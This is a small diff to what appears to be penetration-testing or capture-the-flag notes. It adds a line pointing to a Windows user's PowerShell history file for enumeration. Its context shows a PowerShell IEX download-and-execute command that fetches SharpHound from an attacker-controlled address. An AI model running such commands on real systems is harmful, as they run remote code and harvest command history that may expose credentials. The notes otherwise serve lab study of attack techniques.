@@ -63,6 +63,8 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1')
 #### Enum
 ```
 tasklist /svc
+
+Check history: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 #### BloodHound
 ```
